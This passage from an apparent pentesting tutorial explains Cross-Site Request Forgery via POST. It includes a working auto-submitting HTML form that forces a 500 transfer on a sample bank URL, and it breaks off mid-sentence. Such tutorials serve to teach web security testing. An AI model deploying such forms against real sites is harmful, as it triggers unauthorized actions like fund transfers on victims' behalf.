# Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) is an attack that ***forces authenticated users to submit a request to a Web application against which they are currently authenticated***. <br />
CSRF attacks exploit the trust a Web application has in an authenticated user.
These attacks can be delivered via either the GET or POST method, depending on the scenario.


## Basic CSRF via POST method.
### Basic CSRF via POST method EXPLANATION:
We can perform a CSRF using the POST method. To do this, we have to do the action we want to exploit in our own account and capture the resulting POST request. Once we have it, we create an html form to deliver it. 
We can use automated resources such as [CSRF PoC-Generator](https://hacktify.in/hacktify-csrf-poc-generator/), or we can use the following script customizing it to our own situation:
```html
<html>
<body>
<form action="https://xymbank.com/online/transfer" method="POST">
<input type="hidden" name="amount" value="500"/>
<input type="hidden" name="account" value="654585" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

### Basic CSRF via POST method EXPLOITATION:
- First, we capture the POST method:<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/54d619ca-980e-43c2-aa79-b6cd7fd7047c" width="600"><br />
- Finally, we create the CSRF PoC to deliver it to our victim:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/41cfc524-504d-4f8c-8130-fc019b00d52e" width="700"><br />







In the next example we are going to tr
